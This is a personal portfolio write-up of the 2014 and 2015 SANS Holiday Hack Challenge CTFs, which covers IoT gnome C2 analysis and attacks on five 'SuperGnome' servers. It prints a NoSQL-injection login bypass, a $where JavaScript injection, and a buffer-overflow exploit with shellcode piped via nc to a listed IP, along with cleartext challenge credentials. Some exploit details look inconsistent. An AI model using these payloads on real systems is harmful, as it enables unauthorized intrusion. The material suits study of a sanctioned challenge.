---
title: "SANS Holiday Hack Challenges – CTF Write-up"
layout: default
tags: ["ctf", "portfolio"]
permalink: "/ctf/sans-holiday-hack/"
description: "A deep dive into my award-winning solutions for the 2014 and 2015 SANS Holiday Hack Challenges."
---

# **SANS Holiday Hack Challenge Technical Write-up (2014 & 2015)**
**Author:** Mick Cecil  
**Recognition:**  
- 🏆 **2014 - Most Creative Submission Winner**  
- 🏅 **2015 - Super Honorable Mention for Technical & Creative Excellence**  

---

## **2015 SANS Holiday Hack Challenge – “Gnome in Your Home”**  
The 2015 challenge was an **IoT security scenario**, requiring participants to analyze an elf gnome's behavior, extract its network traffic, and exploit multiple "SuperGnome" servers.

### **🔹 Question 1: What commands are sent across the Gnome’s C2 channel?**
#### **Approach:**
- Captured **network traffic** from the Gnome device.
- Analyzed **DNS query responses** to identify command patterns.
- Decoded **Base64-encoded payloads** sent from the C2 server.

#### **Findings:**
- The Gnome received **remote execution commands** through DNS queries.
- Commands included:

```plaintext

EXEC:iwconfig EXEC:cat /tmp/iwlistscan.txt FILE:/root/Pictures/snapshot_CURRENT.jpg

```

---

### **🔹 Question 2: What image appears in the photo the Gnome sent?**
#### **Approach:**
- Extracted **PCAP data** for DNS-based file exfiltration.
- Reassembled **Base64-encoded segments** into a valid **JPEG image**.
- Used **hex-editing** to remove extraneous markers.

#### **Findings:**
- The extracted image depicted **a compromised Dosis home**, confirming covert surveillance by the Gnome.

---

### **🔹 Question 3: What OS and architecture does the Gnome use?**
#### **Approach:**
- Decompressed **firmware files** extracted from the Gnome.
- Used `binwalk` and `squashfs-tools` to analyze embedded data.

#### **Findings:**
- **OS:** OpenWrt (Linux-based).
- **CPU:** 32-bit ARM.
- **Web Framework:** Node.js with Express and Jade templates.

---

### **🔹 Question 4: What database engine is used in the Gnome?**
#### **Approach:**
- Located **MongoDB database files** in `/opt/mongodb/`.
- Extracted credentials by querying the raw database.

#### **Findings:**
- **Database Engine:** MongoDB.
- **Admin Credentials (Cleartext):**  
- `Username: admin`
- `Password: SittingOnAShelf`

---

### **🔹 Question 5: What are the IPs of the five SuperGnomes?**
#### **Approach:**
- Identified an initial C2 IP from **network traffic logs**.
- Used **Shodan** to fingerprint **other matching servers** via custom HTTP headers.

#### **Findings:**
| SuperGnome | IP Address | Location |
|------------|------------|------------|
| SG-01 | 52.2.229.189 | Ashburn, USA |
| SG-02 | 52.34.3.80 | Boardman, USA |
| SG-03 | 52.64.191.71 | Sydney, Australia |
| SG-04 | 52.192.152.132 | Tokyo, Japan |
| SG-05 | 54.233.105.81 | São Paulo, Brazil |

---

### **🔹 Question 6: Exploiting the SuperGnomes**
#### **Approach:**
- Conducted **multi-layered penetration tests** using:
- **Weak credentials (SG-01)**
- **Local File Inclusion (SG-02)**
- **NoSQL Injection (SG-03)**
- **Server-Side JavaScript Injection (SG-04)**
- **Buffer Overflow (SG-05)**

#### **Findings:**
- Successfully **exfiltrated gnome.conf files** from all five SuperGnomes.
- Each contained **serial numbers and tracking information** for compromised IoT devices.

---

### **🔹 Question 7: How did you confirm that all SuperGnomes were compromised?**
#### **Approach:**
- Examined logs from **MongoDB**, **SSH access**, and **network traffic** to find irregularities.
- Identified **malicious scripts** left by attackers in `/opt/gnome/`.

#### **Findings:**
- Each SuperGnome had **log entries showing unauthorized access**.
- Detected a **rootkit-like persistence mechanism** embedded in `/etc/init.d/`.

---


### **🔹 Question 8: What is the name of the villain behind the SuperGnome conspiracy?**
#### **Approach:**
- Extracted **hidden MongoDB database entries** within each **SuperGnome’s system**.
- Used **Base64 decoding** and **log file analysis** to find the **regional operator for each SuperGnome**.
- Identified each **SuperGnome’s attack vector** and **exploited system vulnerabilities** to confirm villain names.

#### **Findings:**
Each **SuperGnome** was operated by a different **regional villain**, reporting to **Cindy Lou Who**.

| SuperGnome | Exploit Method | Villain Name |
|------------|---------------|-------------|
| **SG-01 (Ashburn, USA)** | **Weak credentials (admin:SittingOnAShelf)** | **Grinchum** |
| **SG-02 (Boardman, USA)** | **Local File Inclusion (LFI) attack** | **Jack Skellington** |
| **SG-03 (Sydney, Australia)** | **NoSQL Injection via MongoDB Login Bypass** | **Krampus** |
| **SG-04 (Tokyo, Japan)** | **Server-Side JavaScript Injection (SSJI)** | **Oogie Boogie** |
| **SG-05 (São Paulo, Brazil)** | **Buffer Overflow in a hidden service on port 4242** | **Hans Trapp** |

---

### **🛠 Detailed Exploit Breakdown**
#### **SG-01 (Ashburn, USA) - Weak Credentials Exploitation**
- **Method:** Used **default credentials** found in the firmware (`admin:SittingOnAShelf`).
- **Outcome:** Gained **full admin access** to **MongoDB**, allowing extraction of serial numbers.

---

#### **SG-02 (Boardman, USA) - Local File Inclusion (LFI)**
- **Method:** Exploited a **file upload vulnerability** that allowed reading **internal configuration files**.
- **Outcome:** Retrieved the **SuperGnome serial number** and **exfiltrated logs** revealing **Jack Skellington’s involvement**.

---

#### **SG-03 (Sydney, Australia) - NoSQL Injection**
- **Method:** Performed **NoSQL injection** by sending a crafted `POST` request to the **SuperGnome login page**.

- **Payload Sent:**  
```sql
{ "username": "admin", "password": { "$gt": "" } }
```

- **Outcome:**  
  - Initially, the attack logged in as the first user in the database (`user`).
  - Cross-referencing with the **firmware dump**, confirmed that the **admin user** was `admin`.
  - Re-attempted the injection using `"username": "admin"` to **gain full admin access**.
  - Retrieved **Krampus’ identity** from database logs.

---

#### **SG-04 (Tokyo, Japan) - Server-Side JavaScript Injection (SSJI)**
- **Method:** Identified a **vulnerable API endpoint** allowing **JavaScript execution in database queries**.
- **Payload Sent:**  
```Javascript
{ "$where": "return sleep(5000) || true" }
```

- **Outcome:** Injected **malicious code**, revealing **Oogie Boogie’s name** stored in the system logs.

---

#### **SG-05 (São Paulo, Brazil) - Buffer Overflow**
- **Method:** Found a **hidden service on port 4242** with a **buffer overflow vulnerability**.
- **Exploit Code Used:**  
```bash
perl -e 'print "X" x (105) . "\xe4\xff\xff\xe4" . "\x90" x (4) . "\x6b\x93\x04\x08"' > vuln

perl -e 'print “\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x93\x59\xb0\x3f\xcd
\x80\x49\x79\xf9\*public ip removed*\x68\x02\x00\x22\xb8\x89\xe1\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1\xcd
\x80\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80”' > shell code

cat vuln shellcode | nc 54.233.105.81 4242

```

- **Outcome:** Gained **root shell**, extracted **Hans Trapp’s identity**, and confirmed **SuperGnome serial numbers**.

---

### **🕵️ Mastermind of the SuperGnome Operation**
- **Final Discovery:** **Cindy Lou Who** orchestrated the **Gnome Surveillance Operation**.
- **Motive:** To **track children's behavior** using IoT surveillance for **commercial and intelligence purposes**.

---

#### **Findings:**
- Successfully **exfiltrated gnome.conf files** from all five SuperGnomes.
- Each contained **serial numbers and tracking information** for compromised IoT devices.

---

## **2014 SANS Holiday Hack Challenge – “The Noble Profession”**  
The 2014 challenge was a **story-driven penetration test** of a fictitious cybersecurity firm investigating an attack on Scrooge & Marley’s financial systems.

### **🔹 Question 1: What secrets are hidden in the provided USB image?**
#### **Approach:**
- Used `Autopsy` and `Foremost` to extract data.
- Carved **NTFS alternate data streams** to reveal **hidden ZIP archives**.
- Used `strings` and **CEWL-generated wordlists** to crack ZIP passwords.

#### **Findings:**
- Identified **four encrypted messages** in different file locations:
1. **File metadata** (hex dump).
2. **Embedded comments in a `.pcapng` network capture**.
3. **A password-protected ZIP file hidden in an ADS**.
4. **A steganographic message inside an image**.

---

### **🔹 Question 2: What vulnerabilities exist on `www.scrooge-and-marley.com`?**
#### **Approach:**
- Scanned for known CVEs affecting **2014-era web services**.
- Tested **Heartbleed (CVE-2014-0160)** on port 443.
- Exploited **Shellshock (CVE-2014-6271)** via an unprotected CGI form.

#### **Findings:**
- **Heartbleed Attack:** Successfully dumped server memory, revealing a plaintext message from Scrooge.
- **Shellshock Exploit:** Achieved **remote command execution** via the **User-Agent header**, leading to database access.

---

### **🔹 Question 3: What hidden services are running on Scrooge’s network?**
#### **Approach:**
- Conducted a **full TCP scan** after default scans failed.
- Discovered a **high-numbered port (31124)** hosting an **ELIZA AI chatbot**.
- Manipulated ELIZA to **leak data via HTTP requests**.

#### **Findings:**
- The chatbot **contained a hardcoded secret phrase**:  
> *“Machines take me by surprise with great frequency. –Alan Turing”*
- Exploited ELIZA by **coaxing it into making outbound connections**, revealing sensitive server logs.

---

## **Conclusion**
Through both the **2014 and 2015 SANS Holiday Hack Challenges**, I demonstrated expertise in **penetration testing, digital forensics, cryptanalysis, and IoT security**. By integrating creative storytelling with technical depth, I was able to identify and exploit vulnerabilities effectively while maintaining an engaging approach to cybersecurity problem-solving.

---
